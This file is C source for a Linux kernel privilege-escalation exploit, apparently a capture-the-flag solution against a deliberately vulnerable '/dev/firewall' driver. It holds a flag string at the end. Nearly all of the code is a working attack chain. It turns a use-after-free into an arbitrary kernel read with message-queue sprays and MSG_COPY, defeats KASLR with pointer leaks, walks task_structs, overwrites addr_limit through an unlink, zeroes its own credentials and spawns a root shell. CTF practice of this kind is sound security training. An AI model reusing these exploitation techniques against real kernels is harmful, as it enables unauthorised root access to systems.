#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#include <sched.h>
#include <signal.h>

#include <fcntl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
//#include <attr/xattr.h>
#include <sys/xattr.h>
//#include <linux/xattr.h>

//#include <sys/syscall.h>  //for SYS_* values

//#include "utils.h"
#include <stdint.h>

#define apply_mask(val,mask) val & mask

#define in_range(x,lb,ub) (lb <= x) && (x <=ub)

unsigned long long kaslr_mask = 0xfffff;

unsigned long long kaslr_slide = 0; 


int driver_fd = 0;
char driver_path[] = "/dev/firewall";



#define INBOUND 0
#define OUTBOUND 1

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

//define easy mode for fire, not for this

#ifdef EASY_MODE
#define DESC_MAX 0x800
#endif
typedef struct user_rule
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    #ifdef EASY_MODE
    char desc[DESC_MAX];
    #endif
} user_rule_t;

typedef struct rule
{
    char iface[16];
    char name[16];
    uint32_t ip;
    uint32_t netmask;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    uint8_t is_duplicated;
    #ifdef EASY_MODE
    char desc[DESC_MAX];
    #endif
} rule_t;

int add_rule(int idx,char * iface, char * name,char * ip,char * netmask,uint8_t type,uint16_t proto,uint16_t port,uint8_t action)
{
  int rv = 0;
  struct user_rule rule_in = {0};
  memcpy(rule_in.iface,iface,16);
  memcpy(rule_in.name,name,16);
  strncpy(rule_in.ip,ip,16);
  strncpy(rule_in.netmask,netmask,16);
  rule_in.idx = idx;
  rule_in.type = type;
  rule_in.proto = proto;
  rule_in.port = port;//note that this is passed through a call to ntohs() before it is written to the struct in kmem
  rule_in.action = action;
  rv = ioctl(driver_fd,ADD_RULE,&rule_in);
  return rv;

}
int edit_rule(int idx,char * iface, char * name,char * ip,char * netmask,uint8_t type,uint16_t proto,uint16_t port,uint8_t action)
{
  int rv = 0;
  struct user_rule rule_in = {0};
  memcpy(rule_in.iface,iface,16);
  memcpy(rule_in.name,name,16);
  strncpy(rule_in.ip,ip,16);
  strncpy(rule_in.netmask,netmask,16);
  rule_in.idx = idx;
  rule_in.type = type;
  rule_in.proto = proto;
  rule_in.port = port; //note that this is passed through a call to ntohs() before it is written to the struct in kmem
  rule_in.action = action;
  rv = ioctl(driver_fd,EDIT_RULE,&rule_in);
  return rv;


}
int delete_rule(int idx,int type)
{
  int rv = 0;
  struct user_rule rule_in = {0};

  rule_in.idx = idx;
  rule_in.type = type;

  rv = ioctl(driver_fd,DELETE_RULE,&rule_in);
  return rv;

}

int dup_rule(int idx,int type)
{
  int rv = 0;
  struct user_rule rule_in = {0};
  rule_in.idx = idx;
  rule_in.type = type;
  rv = ioctl(driver_fd,DUP_RULE,&rule_in);
  return rv;

}




/*
uname -r
5.8.0
 */

/*
struct msgbuf {
  long mtype;       // message type, must be > 0 
  char mtext[0x1];    //message data 
};
*/



struct msgbuf_16 {
  long mtype;       /* message type, must be > 0 */
  char mtext[0x10];    /* message data */
};


int send_msgqueue_0x10(int msgqueue_id,char * buff)
{
  int rv =0;
  struct msgbuf_16 msgbuff = {0};
  msgbuff.mtype = 1;
  memcpy(msgbuff.mtext,buff,0x10);
  //IPC_NOWAIT
  rv = msgsnd(msgqueue_id,&msgbuff,0x10,IPC_NOWAIT);
  return rv;

}

int rcv_msgqueue_n_external(int msgqueue_id,struct msgbuf * mbuff_ptr,int n,long msgtyp,int flags)
{
  int rv;
  rv = msgrcv(msgqueue_id,mbuff_ptr,n,msgtyp,flags);
  return rv;
}

unsigned long long kaddr_upper = 0xffffffff00000000;

//is ktext address
int is_kaddr(unsigned long long addr)
{
  if ((kaddr_upper&addr) == kaddr_upper)
    {
      return 1;
    }
  return 0;
}

  unsigned long long kstack_kheap_upper = 0xffff000000000000;
//is kstack or kheap address
int is_kstack_kheap_addr(unsigned long long addr)
{
  if ((kstack_kheap_upper&addr) == kstack_kheap_upper)
    {
      return 1;
    }
  return 0;
}

unsigned long long kheap_leak = 0;
unsigned long long kheap_ptr = 0;

void addr_to_rule_ipnetmask(unsigned long long addr,struct user_rule * rule)
{
  unsigned int high,low;
  unsigned char * ptr = 0;
  low = addr&0xffffffff;
  high = (addr>>32)&0xffffffff;
  ptr = &low;
  snprintf(rule->ip,16,"%hhu.%hhu.%hhu.%hhu",ptr[0],ptr[1],ptr[2],ptr[3]);
  ptr = &high;
  snprintf(rule->netmask,16,"%hhu.%hhu.%hhu.%hhu",ptr[0],ptr[1],ptr[2],ptr[3]);



}

int read_primitive_msg_queue_id = 0;
int read_primitive_msg_idx = 0;
int read_primitive_slot_idx = 0;//slot in the outbound rule table
char * read_scratch = 0;

char swapper_str[] =  "swapper/0";
unsigned long long swapper_comm_base = 0xffffffff81c12a10;

unsigned long long stext_base = 0xffffffff81000000;
unsigned long long text_leak_base = 0xffffffff81010305;
unsigned long long stext = 0;
unsigned long long init_task_base = 0xffffffff81c124c0;
unsigned long long init_task = 0;
unsigned long long safe_read_offset = 0x30;

int leak_arr1_count = 0;
unsigned long long leak_arr1[512]= {0};
int leak_arr2_count = 0;
unsigned long long leak_arr2[0x2a0]= {0};

//find stack heap or text leak //can obviously extend to take in the leak_array as an argument
int find_sht_leaks(char * buff,int buff_size)
{
  unsigned long long * qword_ptr = 0;
  int num_qwords = buff_size/8;
  int i = 0;
  qword_ptr = buff;
  for( i = 0;i<num_qwords;i++)
    {
      if (is_kstack_kheap_addr(qword_ptr[i]) || is_kaddr(qword_ptr[i]) )
	{
	  if (leak_arr1_count >= sizeof(leak_arr1)/sizeof(unsigned long long))
	    {
	      break;
	    }
	  leak_arr1[leak_arr1_count] = qword_ptr[i];
	  leak_arr1_count++;

	}
    }




}

//find only text leak //can extend as mentioned above
int find_text_leaks(char * buff,int buff_size)
{
  unsigned long long * qword_ptr = 0;
  int num_qwords = buff_size/8;
  int i = 0;
  qword_ptr = buff;
  for( i = 0;i<num_qwords;i++)
    {
      if (is_kaddr(qword_ptr[i]) )
	{
	  if (leak_arr2_count >= sizeof(leak_arr2)/sizeof(unsigned long long))
	    {
	      break;
	    }
	  leak_arr2[leak_arr2_count] = qword_ptr[i];
	  leak_arr2_count++;

	}
    }




}



void dump_qword(unsigned long long * buff, int n)
{
  //defined in utils.h
  //just dumps n qwords from buff to stdout
  //used for debugging and stuff
}

//be careful, our read primitive is not the best
int read_n(char * addr,int n,char * buff) //try not to read more than (0x1000 - 8) bytes by the way
{
  int rv = 0;
struct msgbuf *msgbuf_ptr = 0;
 struct user_rule user_rule_struct = {0};
 struct user_rule * rule_ptr = 0;
 unsigned long long * qword_ptr = 0;
 int read_size = 1024;
 read_size = n;

 rule_ptr = &user_rule_struct;
  memset(user_rule_struct.iface,0,0x10);
  memset(user_rule_struct.name,0,0x10);

  //addr_to_rule_ipnetmask(addr - 8,&user_rule_struct);
 addr_to_rule_ipnetmask(addr - 8,rule_ptr);

  qword_ptr = &(rule_ptr->name[0]);
  qword_ptr[0] = 1;//set type

  qword_ptr[1] = (0x1000 - 0x30) + (read_size);//increase size

rv = edit_rule(0,rule_ptr->iface,rule_ptr->name,rule_ptr->ip,rule_ptr->netmask,OUTBOUND,0,0,0);
//printf("edit_rule() returned %i\n",rv);
 msgbuf_ptr = read_scratch;
 msgbuf_ptr->mtype = 1;
 //read_primitive_msg_idx
  rv = rcv_msgqueue_n_external(read_primitive_msg_queue_id,msgbuf_ptr,(0x1000 - 0x30) + (read_size),read_primitive_msg_idx,MSG_COPY | IPC_NOWAIT);//read message at ordinal position 0
  //printf("msgrcv() returned %i\n",rv);

  //if rv != (0x1000 - 0x30) + 8, then we can return error
  {
    //printf("[read_8]test for swappercomm = '%s'\n",msgbuf_ptr->mtext + 4048);
  memcpy(buff,msgbuf_ptr->mtext + 4048,read_size);
  }
  if (rv > 0 && (rv== (4048 + read_size)))
    {
      return read_size;
    }
  else
    {
      return -1;
    }

}



int read_addr(char * addr, int n, char * buff)
{
  //meh
}

#define to_page(addr) addr&(~0xfffULL)


unsigned long long find_leak(char* buff,unsigned long long buff_size)//4048
{

  unsigned long long upper = 0xffff000000000000;
  unsigned long long * qword_ptr = 0;
  int i = 0;
  qword_ptr = buff;
  for(i = 0;i<buff_size/8;i++)
    {
      if ((qword_ptr[i] & upper) == upper) //looks like a kernel pointer
	{
	  return qword_ptr[i];
	}
    }

  return 0;

}

unsigned long long find_text_leak(char* buff,unsigned long long buff_size)//4048
{

  //unsigned long long upper = 0xffff000000000000;
  unsigned long long upper =  0xffffffff00000000;
  unsigned long long * qword_ptr = 0;
  int i = 0;
  qword_ptr = buff;
  for(i = 0;i<buff_size/8;i++)
    {
      if ((qword_ptr[i] & upper) == upper) //looks like a kernel pointer
	{
	  return qword_ptr[i];
	}
    }

  return 0;

}

int busy_loop()
{
  int i = 0;
  char buff[0x20] = {0};
      memset(buff,0x41,10);
  while (1)
    {
      //prctl(PR_GET_NAME,buff);

      prctl(PR_SET_NAME,buff);
      i++;
    }
}

int make_busy_loop_thread()
{
  int rv = 0;
char *   thread_stack = 0;
 thread_stack = mmap(0,0x1000*8,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
rv  =  clone(busy_loop,thread_stack + 0x1000*8,CLONE_VM,0);
//printf("clone() returned %i\n",rv);
 return rv;
}

int task_struct_tasks_offset = 0x298;
int task_struct_pid_offset = 0x398;
int task_struct_tgid_offset = 0x39c;
int task_struct_cred_offset = 0x538;

char * task_struct_buff = 0;
unsigned long long _find_task(int pid)
{
  char * data = 0;
struct msgbuf *msgbuf_ptr = 0;
 int curr_pid;
  unsigned long long curr_task = init_task;
  unsigned long long next_task = 0;
  if (task_struct_buff == 0)
    {
      task_struct_buff = mmap(0,0x1000*9,PROT_READ | PROT_WRITE,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
    }
  msgbuf_ptr = task_struct_buff;
  while (1)
    {
      printf("curr_task = %p\n",curr_task);
      printf("reading from %p\n",curr_task + safe_read_offset + 8);
      read_n(curr_task + safe_read_offset + 8,0x1000 - 8,task_struct_buff);
      //data = msgbuf_ptr->mtext + 4048;
      data = task_struct_buff;

      curr_pid = *(unsigned int *)((data + task_struct_pid_offset) - (safe_read_offset + 8));
      printf("curr_pid = %i\n",curr_pid);
      if (curr_pid == pid)
	{
	  printf("found pid (%i) in task %p\n",pid,curr_task);
	  return curr_task;
	}


next_task = *(unsigned long long *)((data + task_struct_tasks_offset) - (safe_read_offset + 8));
 next_task = next_task  - task_struct_tasks_offset;
 printf("got next_task = '%p'\n",next_task);
 {
   //dump_qword(task_struct_buff,900);

   //dump_qword(task_struct_buff,900);
 }

 //getchar();
 curr_task = next_task;
    }


}


struct list_head
{
  struct list_head * next, * prev;
};

long debug = 0;

int main(int argc, char * argv[])
{

  int rv = 0;
  char * buff = 0;
  char * buff2 = 0;
  char * buff3 = 0;
  char * buff4 = 0;
  char * bounce_buff = 0;
  char * search=0;
  char * rule_struct = 0;
  char * leakbuff1 = 0;
  int spray_msg_queue_id = 0;
  int v_msg_queue_id = 0;
  int v_msg_queue_id2 = 0;
  int num_spray = 0x1000/0x30;
  unsigned long long *qword_ptr;
  unsigned long long tmp_addr;
  struct user_rule * rule_ptr = 0;
  struct msgbuf *msgbuf_ptr = 0;
  int i = 0;
  unsigned long long swapper_off = swapper_comm_base&0xfff;
  char * ptr = 0;
  unsigned long long text_leak = 0;
  unsigned long long stack_leak = 0;
  //unsigned long long stack_leak_dist = 0x3f40;
  unsigned long long stack_leak_dist = 0x3d00;
  int found = 0;
  int pid = 0;
  unsigned long long temp_task = 0;
  unsigned long long addr_limit_loc = 0;
  struct list_head dumy_listhead = {0};
  unsigned long long cred_struct = 0;
  //read 0x2a0 bytes  from 0x3d00 into stack leak
  int pipefds[2] = {0};

  if (argc > 1)
    {
      debug = strtol(argv[1],0,0);
      printf("debug = %i\n",debug);
    }

  driver_fd = open(driver_path,O_RDONLY);
  printf("driver_fd = %i\n",driver_fd);

  buff = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
  buff2 = mmap(0,0x1000*2,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
  buff3 = mmap(0,0x1000*4,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
  buff4 = mmap(0,0x1000*4,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
leakbuff1= mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
 search = mmap(0,0x1000*2,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);

  printf("buff = %p\n",buff);
  rv = msgget(IPC_PRIVATE,0666);
  printf("msgget returned %i\n",rv);
  spray_msg_queue_id = rv;
  v_msg_queue_id = rv = msgget(IPC_PRIVATE,0666);
  v_msg_queue_id2 = rv = msgget(IPC_PRIVATE,0666);
  printf("msgget returned %i\n",rv);
  
  {
    num_spray = num_spray*2;
  }
  //spray to exhaust slab
  for(i  = 0;i<num_spray;i++)
    {
      rv= send_msgqueue_0x10(spray_msg_queue_id,buff);
    }

  rv = add_rule(0,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x4,0x4,0x4);//A //for leakand read primitive
  printf("add_rule() returned %i\n",rv);
  rv = add_rule(1,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x5,0x5,0x5); //B for unlink
  printf("add_rule() returned %i\n",rv);
  if (1)
  {
  rv = add_rule(2,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x5,0x6,0x6); //
  printf("add_rule() returned %i\n",rv);
  }
  rv = dup_rule(0,INBOUND);//A
  rv = dup_rule(1,INBOUND);//B
  if(debug)
  {
  printf("waiting (post dup)...\n");
  getchar();
  }
  rv = delete_rule(0,INBOUND);//free A while having a reference to it in the outbound table


  rv= send_msgqueue_0x10(v_msg_queue_id,buff); //reallocate A
  printf("msgsnd() returned %i\n",rv);
  rv = delete_rule(1,INBOUND);//free B while having a reference to it in the outbound table


  //we want this to be the only message in this message queue's linked list
  rv= send_msgqueue_0x10(v_msg_queue_id2,buff);//reallocate B
  printf("msgsnd() returned %i\n",rv);
  //we can test to see if we got the object again depending on whether r not we can read more than 16 bytes //I should do this for both, but w/e

  for(i = 0;i<0x1000/0x30;i++)
  {
  rv = make_busy_loop_thread();
  //printf("make_busy_loop_thread() returned %i\n",rv);
  }


  //edit A via the outbound table to corrupt the size field
  //the last 8 bytes of the name field overlap with size
  rule_ptr = buff;
  rule_ptr->name;
  memset(rule_ptr->iface,0,0x10);
  memset(rule_ptr->name,0,0x10);
  qword_ptr = &(rule_ptr->name[0]);
  qword_ptr[0] = 1;//increase size
  qword_ptr[1] = 0x1000 - 0x30;//increase size
  rv = edit_rule(0,rule_ptr->iface,rule_ptr->name,"0.0.0.0","0.0.0.0",OUTBOUND,0,0,0);
printf("edit_rule() returned %i\n",rv);    

  //with msg_copy, mtyp specifies the index of the message
  msgbuf_ptr = buff2;
  msgbuf_ptr->mtype = 1;
  rv = rcv_msgqueue_n_external(v_msg_queue_id,msgbuf_ptr,4096-0x30,0,MSG_COPY | IPC_NOWAIT);//read message at ordinal position 0
  printf("msgrcv() returned %i\n",rv);

 if (debug)
  {
  printf("msgrcv buffer: \n");
  dump_qword(msgbuf_ptr->mtext,4048/8);
  }

  memcpy(leakbuff1,msgbuf_ptr->mtext,4048);
  qword_ptr = leakbuff1;
  kheap_leak = qword_ptr[2];
  stack_leak = qword_ptr[7];
  printf("stack_leak  = %p\n",stack_leak);
  printf("kheap_leak  = %p\n",kheap_leak);
  find_sht_leaks(leakbuff1,0x1000);
  printf("%i possible leaks...\n",leak_arr1_count);
  if (debug)
  {
  printf("leak arr:\n");
  dump_qword(leak_arr1,leak_arr1_count);
  }

  //find stack leak?
  for( i = 0;i<leak_arr1_count;i++)
    {
      if (((leak_arr1[i] & 0xfffULL) == 0) &&  !is_kaddr(leak_arr1[i]))
	{
	  printf("using index %i (%p) for stack leak\n",i,leak_arr1[i]);
	  stack_leak = leak_arr1[i];
	  break;
	}
    }

  printf("[from search] stack_leak  = %p\n",stack_leak);

  if (kheap_leak == 0)
    {
      kheap_leak = find_leak(leakbuff1,4048);
      printf("[from find_leak()] kheap_leak  = %p\n",kheap_leak);
    }

      text_leak = find_text_leak(leakbuff1,4048);
      printf("[from find_text_leak()] text_leak  = %p\n",text_leak);


  if (kheap_leak == 0)
    {
      exit(0);//for now
    }

  kheap_ptr = kheap_leak & (~0xfffULL);
  
  kheap_ptr = kheap_leak;

    //read from kheap_ptr
  rule_ptr = buff3;
  rule_ptr = buff4;
  read_primitive_msg_queue_id = v_msg_queue_id;//set global

  memset(buff3,0,0x1000*4);

  msgbuf_ptr = buff4;
  msgbuf_ptr->mtype = 1;


  //don't use position 1 because we destroyed the list linkage

  memset(msgbuf_ptr->mtext,0,0x1000*4 - 0x10);

  printf("waiting...\n");
 if (debug)
  {
  getchar();
  }

  
  {
    printf("before stack leak usage: \n");
    if (stack_leak)
      {
	printf("using stack leak = %p\n",stack_leak);
	printf("reading from (%p + %p)\n",stack_leak,stack_leak_dist);
	tmp_addr = stack_leak + stack_leak_dist;

	rv = read_n(tmp_addr,0x2a0,search);

	printf("read_n returned %i\n",rv);

	 if (debug)
	{
	dump_qword(search,0x2a0);
	}

	find_text_leaks(search,0x2a0);
	printf("%i possible leaks...\n",leak_arr2_count);
	if (debug)
	{
	printf("leak arr:\n");
	dump_qword(leak_arr2,leak_arr2_count);
	}
	for(i = 0;i<leak_arr2_count;i++)
	  {
	    if ((leak_arr2[i] & 0xfffULL) == (text_leak_base &0xfffULL))
	      {
		text_leak  = leak_arr2[i];
		printf("found text leak at index %i (%p)\n",i,leak_arr2[i]);
		found = 1;
		break;

	      }

	  }
	if (found)
	  {
	    printf("found text leak@ (%p)\n",text_leak);
	    //kaslr_slide = text_leak - (text_leak_base - stext_base);
	    kaslr_slide = text_leak -text_leak_base;
	    printf("kaslr_slide = %p\n",kaslr_slide);
	    printf("look for swapper comm string @ %p\n",swapper_comm_base + kaslr_slide);
	    init_task = init_task_base + kaslr_slide;
	    stext  = stext_base + kaslr_slide;
	  }
	//could exit here if we didn't, or spray and try again


      }

  }


  {
    pid = getpid();
    printf("mypid = %i\n",pid);
    printf("before looking for task struct...\n");
    if (debug)
    {
    getchar();
    }
    temp_task = _find_task(pid);
    printf("_find_task() returned %p\n",temp_task);

    addr_limit_loc = temp_task + 2064;
    printf("addr_limit @ %p\n",addr_limit_loc);
    //now let's try to use an unlink to write to addr_limit

    read_n(temp_task + safe_read_offset + 8,0x1000 - 8,search);
cred_struct = *(unsigned long long *)((search + task_struct_cred_offset) - (safe_read_offset + 8));
 printf("got cred_struct @ %p\n",cred_struct);


  rule_ptr->name;
  memset(rule_ptr->iface,0,0x10);//this overlaps with the linkage field (list_head)
  //set addr-limit to the end of the data or bss section
  //dumy_listhead
  //dumy_listhead.next = ;
  //dumy_listhead.prev = ;
  //target = 0xc6a730 + stext
  dumy_listhead.next = stext + 0xc6a730 - 8; //N
  dumy_listhead.prev = addr_limit_loc; //P
  memcpy(rule_ptr->iface,&dumy_listhead,0x10);
  memset(rule_ptr->name,0,0x10);
  qword_ptr = &(rule_ptr->name[0]);
  qword_ptr[0] = 1;//
  qword_ptr[1] = 0x10;//
  rv = edit_rule(1,rule_ptr->iface,rule_ptr->name,"0.0.0.0","0.0.0.0",OUTBOUND,0,0,0);
printf("edit_rule() returned %i\n",rv);    

  dumy_listhead.next = stext + 0xc6a730 - 8; //N
  dumy_listhead.prev = addr_limit_loc; //P
  printf(" N = %p\n",dumy_listhead.next);
  printf(" P = %p\n",dumy_listhead.prev);
    printf("addr_limit @ %p\n",addr_limit_loc);
 printf("before unlink attempt\n");
 if (debug)
   {
 getchar();
   }
  msgbuf_ptr = buff2;
  msgbuf_ptr->mtype = 1;
   rv = rcv_msgqueue_n_external(v_msg_queue_id2,msgbuf_ptr,0x10,0,IPC_NOWAIT);//read message at ordinal position 0

   
 printf("after unlink attempt\n");
 if (debug)
 {
 getchar();
 }


 //we could go ahead and fill in read_addr() now (after we write to addr_limit again), but w/e
 rv = pipe(pipefds);
 printf("pipe() returned %i\n",rv);
 memset(buff,0,0x10);
 printf("buff = '%s'\n",buff);
 rv = write(pipefds[1],swapper_comm_base + kaslr_slide,0x10);
 printf("write() returned %i\n",rv);
 rv = read(pipefds[0],buff,0x10);
 printf("read() returned %i\n",rv);
 printf("buff = '%s'\n",buff);

 memset(buff,0x0,0x28);
 rv = write(pipefds[1],buff,0x28);
 printf("write() returned %i\n",rv);
 rv = read(pipefds[0],cred_struct,0x28);
 printf("read() returned %i\n",rv);


 memset(buff,0xff,0x8);
 rv = write(pipefds[1],buff,0x8);
 printf("write() returned %i\n",rv);
 rv = read(pipefds[0],addr_limit_loc,0x8);
 printf("read() returned %i\n",rv);

 printf("uid = %i\n",getuid());

 //printf("booooo\n");
 if (getuid() == 0)
   {
     printf("got root!\n");
     system("/bin/sh");
   }

  }

  //corctf{MsG_MsG_!s_4_p0w3rFul_eXpl0it4Ti0n_To0lKiT!}

  if (debug)
    {
  printf("waiting...\n");
  getchar();
    }


}

